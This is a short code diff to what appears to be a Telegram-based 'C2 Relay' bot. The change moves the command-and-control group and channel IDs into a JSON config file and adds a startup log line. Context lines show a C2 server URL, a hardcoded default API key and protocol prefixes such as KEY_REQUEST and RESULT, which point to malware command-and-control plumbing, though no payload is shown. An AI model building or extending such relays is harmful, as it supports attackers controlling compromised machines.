@@ -26,8 +26,17 @@ C2_URL          = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
 C2_KEY          = os.environ.get("C2_API_KEY", "c2_super_secret_key_2026_123456")
 C2_HEADERS      = {"X-API-Key": C2_KEY, "Content-Type": "application/json"}
 
-C2_GROUP_ID     = "-1002470378114"
-C2_CHANNEL_ID   = "-1002426552780"
+_cfg: dict = {}
+try:
+    if os.path.isfile(TELEGRAM_CONFIG):
+        with open(TELEGRAM_CONFIG, "r", encoding="utf-8") as f:
+            _cfg = json.load(f)
+except Exception as e:
+    print(f"⚠️  Could not read telegram_config.json: {e}")
+
+from modules.c2_telegram_ids import resolve_c2_chats
+
+C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(_cfg)
 _C2_PREFIXES    = ("KEY_REQUEST:", "HANDSHAKE:", "RESULT:", "HEARTBEAT:")
 
 
@@ -149,4 +158,5 @@ if __name__ == "__main__":
 
     print("🤖 C2 Relay — جروب + قناة، بروتوكول من بوت / قناة مرتبطة فقط في الجروب")
     print(f"   C2 Server: {C2_URL}")
+    print(f"   C2 group: {C2_GROUP_ID}  |  C2 channel: {C2_CHANNEL_ID}")
     app.run_polling()
